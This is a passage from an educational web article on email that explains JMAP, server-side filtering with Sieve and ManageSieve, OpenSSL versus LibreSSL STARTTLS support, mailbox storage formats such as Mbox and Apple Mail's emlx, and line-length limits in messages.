other protocols can be added in the future.
The choice of <abbr title="JavaScript Object Notation">JSON</abbr> and <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr> is mostly due to their widespread adoption:
There are suitable libraries for all relevant programming languages
and software engineers know how to use those.
It’s worth mentioning that <abbr title="JSON Meta Application Protocol">JMAP</abbr> doesn’t wrap binary data in <abbr title="JavaScript Object Notation">JSON</abbr>.
Binary data is exchanged in <a href="https://jmap.io/spec-core.html#binary-data">separate connections</a>.</li>
  <li><strong>Complexity on server</strong>:
<abbr title="JSON Meta Application Protocol">JMAP</abbr> moves the complexity of handling email’s <a href="#format">message format</a> from the client to the server.
While clients can still fetch the raw message if needed,
for example when implementing <a href="#end-to-end-security">end-to-end security</a>,
the server has to deal with <a href="#multipart-messages">multipart messages</a>,
<a href="#content-encoding">content encodings</a>, <a href="#line-length-limit">line-length limits</a>, etc.
Clients can download and upload messages as a
<a href="https://jmap.io/spec-mail.html#properties-of-the-email-object">simple <abbr title="JavaScript Object Notation">JSON</abbr> object</a>.
Please note that this affects neither how messages are stored on servers
nor how they are <a href="#delivery-protocols">relayed to others</a>.
It just relieves programmers who want to integrate email
from having to take care of encoding and decoding messages correctly.</li>
  <li><strong>Message submission</strong>:
The previous point makes sense only if clients can also
<a href="#submission-versus-relay">submit messages</a> for delivery in the same format.
If the <abbr title="JSON Meta Application Protocol">JMAP</abbr> server <a href="https://jmap.io/spec-mail.html#urnietfparamsjmapsubmission">supports submission</a>,
a client can <a href="https://jmap.io/spec-mail.html#email-submission">instruct it</a>
to send a stored message to its recipients.
The client can generate the <a href="#message-versus-envelope">envelope</a> itself or let the server do it.
By first storing the message as a draft and then moving it to the sent folder after sending it
(see <a href="https://datatracker.ietf.org/doc/html/rfc8621#section-7.5.1">this example</a>),
<abbr title="JSON Meta Application Protocol">JMAP</abbr> also solves the <a href="#double-submission-problem">double-submission problem</a>.</li>
  <li><strong>Flood control</strong>:
Since it’s not always possible to anticipate how much data the server will send back,
<abbr title="JSON Meta Application Protocol">JMAP</abbr> lets clients restrict the size of responses.
This feature is especially valuable on devices with limited bandwidth or expensive roaming.</li>
</ul>

<p>Support for <abbr title="JSON Meta Application Protocol">JMAP</abbr> is still <a href="https://jmap.io/software.html">quite rare</a>,
which is not surprising given that the standard was published only in 2019.
We yet have to see whether it will become a relevant protocol for accessing one’s mailbox.
I certainly hope so, but email is really <a href="#innovation">resistant to innovation</a>.</p>

<h3 id="email-filtering">Email filtering</h3>

<p>It can be useful to <a href="https://en.wikipedia.org/wiki/Email_filtering">filter incoming messages</a>
according to custom rules.
For example, you may want to move certain messages to a certain folder,
mark certain messages as read, or delete certain messages automatically.
Most mail clients allow their users to configure such rules,
which are executed when the mail client receives a new message.
There are several advantages of filtering incoming mail on the server rather than on the client, though:</p>
<ul>
  <li><strong>Synchronization</strong>:
If the filtering rules are stored on the incoming mail server,
they can be inspected and edited through any of the user’s mail clients.
Otherwise, users have to remember on which client they’ve created the rule that they want to modify now.</li>
  <li><strong>No race conditions</strong>:
If the filtering rules are stored on a mail client,
then the rules are not applied when this mail client is offline.
In this situation, other mail clients see unfiltered messages.
If these mail clients apply rules of their own,
you might run into <a href="https://en.wikipedia.org/wiki/Race_condition">race conditions</a>,
where the order in which clients see incoming messages determines the outcome of the filtering.</li>
  <li><strong>Rules for absence</strong>:
Some rules, such as sending <a href="#out-of-office-replies">out-of-office replies</a>,
shall run precisely when all mail clients are offline.
This is not possible when the rules must be executed by mail clients.</li>
  <li><strong>Rejection during delivery</strong>:
Unlike clients, incoming mail servers can reject a message
<a href="https://datatracker.ietf.org/doc/html/rfc5429#section-2.1.1">during its delivery</a>.
By sending the <a href="https://en.wikipedia.org/wiki/List_of_SMTP_server_return_codes#-_5yz_Permanent_Negative_Completion">550 response code</a>
during the <a href="#simple-mail-transfer-protocol"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> session</a>,
the incoming mail server can inform the sender about the rejection
without causing <a href="#backscatter">backscatter</a> with <a href="#bounce-messages">bounce messages</a>.</li>
</ul>

<p>To achieve server-side filtering,
we need a standardized <a href="#mail-filtering-language">mail filtering language</a>
and a standardized <a href="#filter-management-protocol">filter management protocol</a>.</p>

<figure>
  <svg id="figure-email-filtering" data-name="email-filtering" width="574.241" height="190.375" viewBox="-1.25 -53.437 574.241 190.375" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="416.124" y1="41.75" x2="466.538" y2="93.938" marker-end="url(#arrow)" stroke-dasharray="66"></line>
    <line x1="416.124" y1="41.75" x2="466.538" y2="-10.437" marker-end="url(#arrow-gray)" stroke-dasharray="66"></line>
    <line x1="260.195" y1="41.75" x2="310.609" y2="41.75" marker-end="url(#arrow)" stroke-dasharray="43"></line>
    <line x1="104.265" y1="41.75" x2="154.679" y2="41.75" marker-end="url(#arrow)" stroke-dasharray="43"></line>
    <rect x="0" y="0" width="103.953" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="51.976" y="36.65"><tspan>Mail client</tspan></tspan><tspan x="51.976" y="58.65">of sender</tspan>
    </text>
    <rect x="155.929" y="0" width="103.953" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="207.906" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="207.906" y="47.65"><tspan>mail server</tspan></tspan><tspan x="207.906" y="69.65">of sender</tspan>
    </text>
    <rect x="311.859" y="0" width="103.953" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="363.835" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="363.835" y="47.65"><tspan>mail server</tspan></tspan><tspan x="363.835" y="69.65">of recipient</tspan>
    </text>
    <rect x="467.788" y="-52.187" width="103.953" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="519.765" y="-26.537"><tspan>Offline</tspan></tspan><tspan x="519.765" y="-4.537"><tspan>mail client</tspan></tspan><tspan x="519.765" y="17.463">of recipient</tspan>
    </text>
    <rect x="467.788" y="52.188" width="103.953" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="519.765" y="77.838"><tspan>Online</tspan></tspan><tspan x="519.765" y="99.838"><tspan>mail client</tspan></tspan><tspan x="519.765" y="121.838">of recipient</tspan>
    </text>

</svg>

  <figcaption>
How a message is delivered from the mail client of the sender to the mail clients of the recipient.
Messages can be filtered by the incoming mail server (in green) or by an online mail client (in blue).
</figcaption>
</figure>

<h4 id="mail-filtering-language">Mail filtering language (Sieve)</h4>

<p><a href="https://en.wikipedia.org/wiki/Sieve_(mail_filtering_language)">Sieve</a>
is a language for filtering messages on the incoming mail server.
It is specified in <a href="https://datatracker.ietf.org/doc/html/rfc5228"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5228</a> and it is fairly simple:
Using the <a href="https://datatracker.ietf.org/doc/html/rfc5228#section-3.1">control commands</a> <code>if</code>, <code>elsif</code>, and <code>else</code>,
you can specify under <a href="https://datatracker.ietf.org/doc/html/rfc5228#section-5">which conditions</a>
a <a href="https://datatracker.ietf.org/doc/html/rfc5228#section-4">specific action</a> shall be applied.
You can find plenty of examples throughout the <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> as well as
<a href="https://docs.gandi.net/en/gandimail/sieve/sample_filters.html">here</a>
and <a href="https://wiki.dovecot.org/Pigeonhole/Sieve/Examples">here</a>.
There are just a couple of things you should know to understand them:</p>
<ul>
  <li><strong>Arguments</strong>: Most commands in the Sieve language take arguments.
Mandatory arguments are determined by their <a href="https://datatracker.ietf.org/doc/html/rfc5228#section-2.6.1">position</a>,
optional arguments are identified by a
<a href="https://datatracker.ietf.org/doc/html/rfc5228#section-2.6.2">colon followed by their name</a>.
Some optional arguments can take arguments themselves: <code>:name value</code>.
This is similar to arguments in the <a href="#command-line-interface">command-line interface</a>
but with <code>:</code> instead of <code>-</code> before the name.
When optional arguments are not provided, their default values are used instead.</li>
  <li><strong>Extensions</strong>: The Sieve language is <a href="https://datatracker.ietf.org/doc/html/rfc5228#section-6">extensible</a>.
A script has to list the extensions which it uses at the top of its code
with <a href="https://datatracker.ietf.org/doc/html/rfc5228#section-3.2"><code>require</code></a>.</li>
  <li><strong>Implicit keep</strong>: Each message is <a href="https://datatracker.ietf.org/doc/html/rfc5228#section-2.10.2">stored in the inbox</a>
unless it is moved to a folder, forwarded to an address, or discarded explicitly.</li>
  <li><strong>String lists</strong>: Wherever a <a href="https://datatracker.ietf.org/doc/html/rfc5228#section-2.4.2.1">list of strings</a>
is expected, such as <code>[&#34;To&#34;, &#34;Cc&#34;]</code>, a string without brackets, such as <code>&#34;To&#34;</code>, can be used.</li>
  <li><strong>Prefix notation</strong>: Commands and arguments are nested not with parentheses
but by earlier <a href="https://en.wikipedia.org/wiki/Lexical_analysis#Token">tokens</a> consuming later ones.
For example, the negation of the condition <code>exists &#34;Date&#34;</code> is <code>not exists &#34;Date&#34;</code>.
This is similar to the <a href="https://en.wikipedia.org/wiki/Polish_notation">prefix notation</a>.</li>
  <li><strong>Comments</strong>: If you use <code>#</code> outside of double quotes,
the incoming mail server <a href="https://datatracker.ietf.org/doc/html/rfc5228#section-2.3">ignores all characters</a>
including this one until the end of the line.
<a href="https://en.wikipedia.org/wiki/Comment_(computer_programming)">Comments</a>
which span less or more than a line have to be enclosed in <code>/*</code> and <code>*/</code>.</li>
  <li><strong>No loops</strong>: The Sieve language doesn’t support <a href="https://en.wikipedia.org/wiki/Control_flow#Loops">loops</a>.
Each <a href="https://datatracker.ietf.org/doc/html/rfc5228#section-2.8">block</a> is executed once or not at all.</li>
</ul>

<p>You can generate simple filtering rules with the following tool.
Make sure that the <code>Argument</code> makes sense for the chosen <code>Action</code>.
<code>Move</code> requires the name of a folder, <code>Forward</code> an email address,
<code>Flag</code> the name of a flag, and <code>Reply</code> the text of the reply.</p>



<p>Users don’t have to learn the Sieve language.
Mail clients can offer a <a href="https://en.wikipedia.org/wiki/Graphical_user_interface">graphical user interface (<abbr title="Graphical User Interface">GUI</abbr>)</a>
similar to the tool above, where users don’t have to see the generated code.
You find a list of all the extensions to the Sieve mail filtering language
<a href="https://en.wikipedia.org/wiki/Sieve_%28mail_filtering_language%29#Extensions">on Wikipedia</a>.</p>

<details>
  

  <p>Among the <a href="https://datatracker.ietf.org/doc/html/rfc3834#section-1.1">reasons</a>
for sending an automatic response to the sender of a message are:</p>
  <ul>
    <li><strong>Vacation notice</strong>: Inform the sender that the message won’t be read in the coming days.</li>
    <li><strong>Change-of-address notice</strong>: Inform the sender that the recipient’s email address has changed.</li>
  </ul>

  <p>Prior to <a href="#json-meta-application-protocol"><abbr title="JSON Meta Application Protocol">JMAP</abbr></a>,
where servers <a href="https://jmap.io/spec-mail.html#urnietfparamsjmapvacationresponse">can support</a>
the configuration of <a href="https://jmap.io/spec-mail.html#vacation-response">vacation responses</a>,
<a href="#mail-filtering-language">Sieve</a> and <a href="#filter-management-protocol">ManageSieve</a>
with the <a href="https://datatracker.ietf.org/doc/html/rfc5230">vacation extension</a>
were the only standardized way to configure such responses.
According to <a href="https://datatracker.ietf.org/doc/html/rfc3834#page-5"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3834</a>,
the same response should be sent to the same sender only once within a period of several days
even when the sender sends additional messages.</p>

  <figure>
    
    <figcaption>
A simple Sieve script for an automatic vacation response, which I’ve adapted
<a href="https://docs.gandi.net/en/gandimail/sieve/sample_filters.html#out-of-office-auto-reply">from Gandi</a>.
</figcaption>
  </figure>

</details>

<details>
  <summary id="sieve-support">
Support by mailbox providers and mail clients
</summary>

  <p>Unfortunately, none of the <a href="#popular-mailbox-providers">big free mailbox providers</a> support Sieve.
If you pay for your mailbox, though, chances are that you can use the Sieve language
since it is implemented by the most popular <a href="http://sieve.info/servers">mail servers</a>.
Providers with Sieve support include <a href="https://www.fastmail.com/help/technical/sieve.html">Fastmail</a>,
<a href="https://kb.mailbox.org/pages/viewpage.action?pageId=1181543">mailbox.org</a>,
<a href="https://proton.me/support/sieve-advanced-custom-filters">Proton Mail</a>,
and <a href="https://docs.gandi.net/en/gandimail/sieve/index.html">Gandi</a>.
Other mailbox providers support server-side filters with proprietary rules through their web interface.
One example is <a href="https://mail.google.com/">Gmail</a>:</p>

  <figure>
    <p><img src="https://evalapply.org/pages/email/generated/gmail-filter-options.png"/>
    

</p>

    <figcaption>Gmail users can go to the <a href="https://mail.google.com/mail/u/0/#settings/filters">Filters and Blocked Addresses</a> tab of their settings and click on “Create a new filter”. While Gmail has an <a href="https://developers.google.com/gmail/api/guides/filter_settings"><abbr title="Application Programming Interface">API</abbr> for managing filters</a>, other mail clients won’t support such a proprietary protocol.</figcaption>

  </figure>

  <p>You might struggle more to find a <a href="http://sieve.info/clients">suitable mail client</a>.
When it comes to desktop clients, there’s basically just a
<a href="https://addons.thunderbird.net/en-US/thunderbird/addon/sieve/">plugin</a> for <a href="https://www.thunderbird.net/">Thunderbird</a>.
If you’re willing to use a <a href="#webmail">web client</a>, <a href="https://roundcube.net/">Roundcube</a> has you covered as well.</p>

</details>

<h4 id="filter-management-protocol">Filter management protocol (ManageSieve)</h4>

<p>ManageSieve is a protocol for managing <a href="#mail-filtering-language">Sieve scripts</a> remotely.
It is specified in <a href="https://datatracker.ietf.org/doc/html/rfc5804"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5804</a>
and works similar to the protocols we have seen so far.
After an initial greeting from the server,
the client sends commands to which the server responds.
Just like <a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a>,
responses are completed with a line which starts with <code>OK</code> or <code>NO</code>;
but unlike <abbr title="Internet Message Access Protocol">IMAP</abbr>, the commands are not preceded with a tag.
Just like <abbr title="Internet Message Access Protocol">IMAP</abbr>, multiline strings are prefixed with their length;
but unlike <abbr title="Internet Message Access Protocol">IMAP</abbr>, the client can <a href="https://datatracker.ietf.org/doc/html/rfc2244#section-2.6.3">include a plus</a>
to continue with the string without having to wait for a continuation response from the server.
Just like <a href="#smtp-for-relay-with-implicit-tls"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> for Relay</a>,
there’s no variant of ManageSieve which can be used with <a href="#use-of-tls">Implicit <abbr title="Transport Layer Security">TLS</abbr></a>.
The server sends its <a href="https://datatracker.ietf.org/doc/html/rfc5804#section-1.7">capabilities</a>
automatically in its greeting and after successful
<a href="https://datatracker.ietf.org/doc/html/rfc5804#section-2.2"><code>STARTTLS</code></a> and
<a href="https://datatracker.ietf.org/doc/html/rfc5804#section-2.1"><code>AUTHENTICATE</code></a> commands.
As part of the capabilities, the server indicates which extensions to the Sieve language
and which <a href="#user-authentication"><abbr title="Simple Authentication and Security Layer">SASL</abbr> mechanisms</a> it supports.
According to <a href="https://datatracker.ietf.org/doc/html/rfc5804#page-13"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5804</a>,
ManageSieve servers have to support <a href="#user-authentication"><code>PLAIN</code></a> over <abbr title="Transport Layer Security">TLS</abbr>
and <a href="#salted-challenge-response-authentication-mechanism"><code>SCRAM-SHA-1</code></a>.</p>

<p>The following tool shows you how to use the <a href="https://datatracker.ietf.org/doc/html/rfc5804#section-2">ManageSieve commands</a>
from your <a href="#command-line-interface">command-line interface</a>.
Unlike the previous tools,
you have to configure the address and the <a href="https://evalapply.org/internet/#port-numbers">port number</a> of the server manually
as this information is not included in <a href="#configuration-database">Thunderbird’s configuration files</a>.
The standard describes how to locate the ManageSieve server
<a href="https://datatracker.ietf.org/doc/html/rfc5804#section-1.8">with <code>SRV</code> records</a>,
and the <a href="#autoconfiguration">autoconfiguration tool</a> above does query the <code>_sieve._tcp</code> subdomain.
However, since virtually no one configures such <code>SRV</code> records (at least not for the ManageSieve protocol),
I didn’t bother to implement this discovery mechanism here.
ManageSieve servers listen <a href="https://datatracker.ietf.org/doc/html/rfc5804#section-1.8">on port 4190</a> by default.
The <a href="https://addons.thunderbird.net/en-US/thunderbird/addon/sieve/">Thunderbird plugin</a>, which I mentioned earlier,
simply <a href="https://github.com/thsmi/sieve/blob/8f83cfb2f1b18323311f01269294c6c21159a905/src/app/libs/libManageSieve/SieveAutoConfig.js#L68">probes this port</a>
on the <a href="https://github.com/thsmi/sieve/blob/8f83cfb2f1b18323311f01269294c6c21159a905/src/app/libs/managesieve.ui/importer/SieveThunderbirdImport.js#L187-L197"><abbr title="Internet Message Access Protocol">IMAP</abbr> server</a>
in order to configure itself.</p>

<p><strong>Important</strong>: Since <a href="#openssl-versus-libressl">LibreSSL</a> doesn’t support the ManageSieve <code>STARTTLS</code> command,
you have to use <a href="#openssl-versus-libressl">OpenSSL</a>
(see the <a href="#libressl-doesnt-support-managesieve">boxes</a> <a href="#install-openssl-on-macos">below</a>).</p>



<p><strong>Explanation</strong>: While you can have multiple scripts on the server,
at most one of them can be <a href="https://datatracker.ietf.org/doc/html/rfc5804#section-1.4">active</a>.
You cannot <a href="https://datatracker.ietf.org/doc/html/rfc5804#section-2.10">delete</a> the active script.
You can deactivate the active script by <a href="https://datatracker.ietf.org/doc/html/rfc5804#section-2.8">activating</a>
another script or by using an empty script name to set no script active.</p>

<details>
  <summary id="libressl-doesnt-support-managesieve">
LibreSSL doesn’t support ManageSieve
</summary>

  <p>With the <code>-starttls</code> option,
you tell <code>openssl</code> for which protocol you want to <a href="#starttls-extension">start <abbr title="Transport Layer Security">TLS</abbr></a>.
There are <a href="#openssl-versus-libressl">two implementations of <code>openssl</code></a>:
<a href="https://www.openssl.org/docs/manmaster/man1/openssl-s_client.html#starttls-protocol">OpenSSL supports ManageSieve</a>,
<a href="https://man.openbsd.org/openssl.1#starttls">LibreSSL doesn’t</a>.
If you provide <code>-starttls sieve</code>, OpenSSL executes
<a href="https://github.com/openssl/openssl/blob/66923436788d307c8e64cc392ffcd9631065eaa5/apps/s_client.c#L2623-L2671">this code</a>.
Can’t we use one of the other protocol options to let LibreSSL send
<a href="https://datatracker.ietf.org/doc/html/rfc5804#section-2.2"><code>STARTTLS</code></a> to the server?
The answer is no, unfortunately:</p>
  <ul>
    <li><a href="https://github.com/libressl-portable/openbsd/blob/6b643cda77ab1b4fede5c692cebfb21f8ef16f95/src/usr.bin/openssl/s_client.c#L1214-L1237"><abbr title="Internet Message Access Protocol">IMAP</abbr></a>:
LibreSSL first issues <code>. CAPABILITY</code> to check whether the server supports <code>STARTTLS</code>.
ManageSieve servers ignore this as an invalid command.
LibreSSL then tries to initiate <abbr title="Transport Layer Security">TLS</abbr> anyway and sends <code>. STARTTLS</code>.
Since the ManageSieve protocol doesn’t use tags,
this line fails to achieve what we want.</li>
    <li><a href="https://github.com/libressl-portable/openbsd/blob/6b643cda77ab1b4fede5c692cebfb21f8ef16f95/src/usr.bin/openssl/s_client.c#L1206-L1213"><abbr title="Post Office Protocol version 3">POP3</abbr></a>:
Using <code>-starttls pop3</code> doesn’t work because <abbr title="Post Office Protocol version 3">POP3</abbr> clients use
<a href="#pop3-extensions"><code>STLS</code></a> instead of <a href="#starttls-extension"><code>STARTTLS</code></a> to upgrade the connection.</li>
    <li><a href="https://github.com/libressl-portable/openbsd/blob/6b643cda77ab1b4fede5c692cebfb21f8ef16f95/src/usr.bin/openssl/s_client.c#L1176-L1205"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a>:
Using <code>-starttls smtp</code> could work but for some reason it also doesn’t work.
LibreSSL first sends the <a href="#extended-simple-mail-transfer-protocol"><code>EHLO</code> command</a>,
which is ignored by ManageSieve servers as an invalid command.
Continuing anyway, LibreSSL sends <code>STARTTLS</code> to the server and doesn’t check the response,
which is exactly what we were looking for.
Unfortunately, this still fails.
If you know why, please <a href="mailto:contact@ef1p.com">let me know</a>.</li>
  </ul>

  <p>Of all the protocols we have seen so far,
not two of them initiate <abbr title="Transport Layer Security">TLS</abbr> in the same way.
Thus, if you want to use the ManageSieve protocol from the <a href="#command-line-interface">command line</a>,
you have to <a href="#install-openssl-on-macos">install OpenSSL</a>.
You can check what you have with <code>openssl version</code>.</p>

</details>

<details>
  <summary id="install-openssl-on-macos">
How to install OpenSSL on macOS
</summary>

  <p>The easiest way to install <a href="https://www.openssl.org/">OpenSSL</a> on macOS is with <a href="https://brew.sh/">Homebrew</a>.
You can check whether Homebrew is already installed with:</p>

  

  <p>If this is not the case, you can install Homebrew with:</p>

  

  <p>Afterwards, you can install OpenSSL with:</p>

  

  <p>By default, OpenSSL is installed in the following location without replacing the preinstalled LibreSSL:</p>

  

  <p><a href="#tool-protocol-managesieve&amp;openssl=%2Fusr%2Flocal%2Fopt%2Fopenssl%2Fbin%2Fopenssl">Click here</a>
to use this as the OpenSSL command in the <a href="#tool-protocol-managesieve">tool above</a>.</p>

</details>

<h2 id="format">Format</h2>

<p>The format of an email message is specified in <a href="https://datatracker.ietf.org/doc/html/rfc5322"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a>.
The goal of this chapter is to make you comfortable reading raw messages.</p>

<details open="">
  <summary id="raw-message">
How to display the raw message
</summary>

  <p>Mail clients don’t display all <a href="#header-fields-and-body">header fields</a> by default.
Here is how you can display the raw message as it arrived in your mailbox:</p>
  <ul>
    <li><a href="https://support.google.com/mail/answer/29436"><strong>Gmail</strong></a>:
Open a message, click on ⋮ in the upper right corner, then on “Show original”.</li>
    <li><a href="https://help.yahoo.com/kb/SLN22026.html"><strong>Yahoo</strong></a>:
Open a message, click on ⋯ in the bottom middle, then on “View raw message”.</li>
    <li><a href="https://support.office.com/en-us/article/view-internet-message-headers-cd039382-dc6e-4264-ac74-c048563d212c"><strong>Outlook</strong></a>:
      <ul>
        <li>Web: Click on ⋯ in the upper right corner, then on “View” and “View message source”.</li>
        <li>Desktop: Double-click a message, click on the “File” menu and then select “Properties”.</li>
      </ul>
    </li>
    <li><strong>Thunderbird</strong>:
      <ul>
        <li>Raw message: Select a message, click on the “More” button and then “View Source” (or use ⌘U).</li>
        <li>All header fields: Click on the “View” menu, then on “Headers” and “All” (or on “Normal” to go back).</li>
      </ul>
    </li>
    <li><strong>Apple Mail</strong>:
      <ul>
        <li>Raw message: Click on the “View” menu, then on “Message” and “Raw Source” (or use the shortcut ⌥⌘U).</li>
        <li><a href="https://support.apple.com/guide/mail/show-detailed-email-headers-mlhlp1089/mac">All header fields</a>:
Click on the “View” menu, then on “Message” and “All Headers” (or use the shortcut ⇧⌘H).</li>
        <li><a href="https://support.apple.com/guide/mail/change-viewing-preferences-cpmlprefview/mac">Change preferences</a>:
In the “Viewing” tab of the preferences, you can configure which header fields are displayed.</li>
      </ul>
    </li>
  </ul>

</details>

<h3 id="file-format">File format</h3>

<p>Since messages, including <a href="#multipart-messages">attachments</a>, are just text,
they can be stored as simple <a href="https://en.wikipedia.org/wiki/Text_file">text files</a>.
A common <a href="https://en.wikipedia.org/wiki/Filename_extension">filename extension</a>
for emails is <a href="https://en.wikipedia.org/wiki/Email#Filename_extensions"><code>.eml</code></a>.
Such files can be viewed with any <a href="https://en.wikipedia.org/wiki/Text_editor">text editor</a>.
Desktop clients usually have an option to save a message as a file,
and among Web clients, at least Gmail allows you to download a message in the “⋮” menu,
which is located in the upper right corner.</p>

<details>
  <summary id="storage-format">
Storage format
</summary>

  <p>For their own purposes, mail clients can store messages in whatever format they want.
The two formats which are used by several mail clients and servers to store messages
are <a href="https://en.wikipedia.org/wiki/Mbox">Mbox</a> and <a href="https://en.wikipedia.org/wiki/Maildir">Maildir</a>.
By default, Thunderbird uses the former but it can also be configured to use the latter.
The Mbox format is specified in <a href="https://datatracker.ietf.org/doc/html/rfc4155"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4155</a>.
All messages are appended in their <a href="#raw-message">raw format</a> to a single file.
Mbox is a <a href="https://evalapply.org/internet/#text-based-protocols">text-based format</a>,
which means that a given string, namely <code>From …</code>, is used to delimit the messages
and that occurrences of this string in messages have to be escaped.
Storing all the messages in a single file is not ideal
as it might easily get corrupted if it’s not properly <a href="https://en.wikipedia.org/wiki/File_locking">locked</a>
while reading from and writing to it.
Additionally, this format is inappropriate for <a href="https://en.wikipedia.org/wiki/Backup">backup systems</a>
that copy the complete file and not just the <a href="https://en.wikipedia.org/wiki/File_comparison">differences</a>
when the content of a file has changed.
Thunderbird stores the messages at
<code>~/Library/Thunderbird/Profiles/{RandomString}.default/ImapMail/{MailServer}</code> on macOS.
If you use another operating system, you find the storage location on
<a href="https://support.mozilla.org/en-US/kb/profiles-where-thunderbird-stores-user-data">this page</a>.
This directory contains two files for each of your mailbox folders.
For example, you should have a large <code>INBOX</code> file and a much smaller <code>INBOX.msf</code> file,
which is used to index the messages in the former file.
(<abbr title="Mail Summary File as used by Thunderbird">MSF</abbr> stands for mail summary file.)
You can use the <a href="https://en.wikipedia.org/wiki/Tail_(Unix)"><code>tail</code> command</a>
to display the specified number of lines of the last message that you’ve received:
<code>tail -n 100 INBOX</code>.
Unless you want to transfer all your messages to a new computer,
you shouldn’t move or modify such files as this likely causes problems for your mail client.</p>

</details>

<details>
  <summary id="apple-mail-storage-format">
Apple Mail storage format
</summary>

  <p>Similar to <a href="#storage-format">Maildir</a>,
Apple Mail stores each message in a separate file at <code>~/Library/Mail/</code>.
The used format is proprietary and there’s no official documentation about it
but it’s fairly easy to <a href="https://en.wikipedia.org/wiki/Reverse_engineering">reverse engineer</a>.
After a folder with the version number of the format, <code>V7</code> in my case,
Apple Mail generates a folder for each of the added email accounts
with a <a href="#universally-unique-identifier">Universally Unique Identifier (<abbr title="Universally Unique Identifier">UUID</abbr>)</a> as its name.
Inside these accounts folders, Apple Mail generates a folder ending with <code>.mbox</code>
for each of the <a href="#protocol-states"><abbr title="Internet Message Access Protocol">IMAP</abbr> folders</a>,
such as <code>INBOX.mbox</code>, <code>Sent Messages.mbox</code>, and so on.
These mailbox folders contain another folder with a <abbr title="Universally Unique Identifier">UUID</abbr>,
which finally contains the <code>Data</code> folder with the actual messages in further folders.
Put together, the folder nesting is as follows: <code>~/Library/Mail/V7/{UUID}/INBOX.mbox/{UUID}/Data</code>.</p>

  <p>Apple Mail enumerates the messages with a single counter across all your accounts.
It uses the <a href="https://en.wikipedia.org/wiki/Filename_extension">filename extensions</a>
<code>.emlx</code> for messages without attachments and <code>.partial.emlx</code> for messages with attachments.
In these <code>emlx</code> files, Apple Mail prepends the length of the message in bytes to the raw message
and appends a <a href="https://en.wikipedia.org/wiki/Property_list">property list</a> with additional information.
It’s a text-based format that you can open with any <a href="https://en.wikipedia.org/wiki/Text_editor">text editor</a>.
The messages are stored in a <code>Messages</code> folder inside the <code>Data</code> folder with their number used as their name.
For example, you might have <code>…/Data/Messages/123.emlx</code>.
If the message contains attachments,
Apple Mail removes the attachments (at least in most cases)
and stores them separately in an <code>Attachments</code> folder.
For example, if message 123 has an attachment,
the message is stored at <code>…/Data/Messages/123.partial.emlx</code>
and its attachment at <code>…/Data/Attachments/123/{Position}/Filename.pdf</code>.
The <code>Position</code> encodes where the attachment was included
in the message’s <a href="#multipart-messages">multipart hierarchy</a>.
In an effort to limit the number of files to 1’000 per folder,
Apple Mail creates subfolders when the message number becomes larger than 999.
For example, message 1234 is stored at <code>…/Data/1/Messages/1234.emlx</code>,
message 12345 at <code>…/Data/2/1/Messages/12345.emlx</code>,
and message 123456 at <code>…/Data/3/2/1/Messages/123456.emlx</code>.</p>

  <p>Please note that you have to give the <a href="https://en.wikipedia.org/wiki/Terminal_(macOS)">Terminal</a>
full disk access in the “System Preferences” under “Security &amp; Privacy” and then “Privacy”
if you want to access the <code>~/Library/Mail/</code> folder from the command line because of the
<a href="https://en.wikipedia.org/wiki/System_Integrity_Protection">System Integrity Protection (<abbr title="System Integrity Protection">SIP</abbr>)</a> of macOS.
With full disk access enabled, you can find the message with a particular number
with <code>find ~/Library/Mail/ -name &#39;1234.*emlx&#39;</code>.
If you need to convert <code>.emlx</code> files back to <code>.eml</code> files,
for example to migrate them to a different mail client or mailbox provider,
you may want to have a look at <a href="https://github.com/qqilihq/partial-emlx-converter">this project</a>.</p>

</details>

<h3 id="line-length-limit">Line-length limit</h3>

<p>According to <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-2.1.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a>,
each line of a message may consist of at most 1’000 <abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters,
including <a href="#newline-characters"><abbr title="Carriage Return (first newline character)">CR</abbr> + <abbr title="Line Feed (second newline character)">LF</abbr></a>.
Implementations are free to accept longer lines,
but since some implementations cannot handle longer lines,
you shouldn’t send them.
The <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> even recommends limiting lines at 80 characters
to accommodate clients that truncate longer lines in violation of the standard.
In order to leave the line wrapping to the mail client of the recipient,
the mail client of the sender has to <a href="#content-encoding">encode the body</a>
if the body contains lines which are too long.
If a <a href="#header-fields-and-body">header field</a> is <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-2.2.3">too long</a>,
it must be broken into several lines with
<a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.2.2">folding whitespace</a>:
<code>{CR}{LF}</code> followed by at least <a href="https://datatracker.ietf.org/doc/html/rfc5234#appendix-B.1">one space or tab</a>.
If a line in the header section of a message starts with whitespace,
its content belongs to the header field on the previous line.
The procedure of breaking lines as done by the sender is called <em>folding</em>,
the procedure of joining lines as done by the recipient is called <em>unfolding</em>.
When unfolding, runs of whitespace characters are replaced with a single
<a href="https://en.wikipedia.org/wiki/Space_(punctuation)">space character</a>.</p>

<h3 id="message-identification">Message identification</h3>

